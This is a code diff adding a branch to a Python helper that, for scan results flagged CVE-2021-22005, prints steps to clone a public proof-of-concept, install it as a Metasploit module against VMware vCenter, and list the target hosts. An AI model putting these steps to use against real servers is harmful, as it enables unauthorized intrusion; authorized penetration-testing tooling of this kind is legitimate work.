@@ -22,6 +22,21 @@ def process(hosts):
         print("msf - use exploit/linux/http/vmware_vcenter_vsan_health_rce")
         for a in z:
             print(a.rsplit(" ", 1)[1])
+            
+    z = []
+    for host in hosts:
+        if "CVE-2021-22005" in host:
+            z.append(host)
+    if len(z) > 0:
+        print("CVE-2021-22005:")
+        print("git clone https://github.com/TaroballzChen/CVE-2021-22005-metasploit")
+        print("cd CVE-2021-22005-metasploit")
+        print("mkdir -p ~/.msf4/modules/auxiliary/scanner/http")
+        print("cp vmware_vcenter_server_file_upload_poc.py ~/.msf4/modules/auxiliary/scanner/http/")
+        print("chmod +x ~/.msf4/modules/auxiliary/scanner/http/vmware_vcenter_server_file_upload_poc.py")
+        print("msf - use exploit/linux/http/vmware_vcenter_server_file_upload_poc.py")
+        for a in z:
+            print(a.rsplit(" ", 1)[1])
 
         
         
